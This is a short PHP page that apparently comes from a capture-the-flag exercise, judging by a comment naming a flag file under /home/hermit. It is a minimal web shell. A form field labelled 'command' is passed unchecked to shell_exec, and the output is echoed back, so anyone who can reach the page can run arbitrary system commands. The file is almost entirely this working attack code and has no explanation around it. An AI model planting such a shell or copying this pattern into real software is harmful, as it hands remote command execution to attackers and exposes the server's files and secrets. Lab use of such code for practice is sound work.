<form method="post">
command: <input type="text" name="keyword" default="ls"><br>
<input type="submit" name="button1" value="Button1">
</form>

<!-- The flag was in /home/hermit/userflags.txt -->

<?php
if(isset($_POST['button1'])){
  $keywords=$_POST["keyword"];
  $result=shell_exec($keywords);
  echo '<pre>'.$result.'</pre>';
}
?>
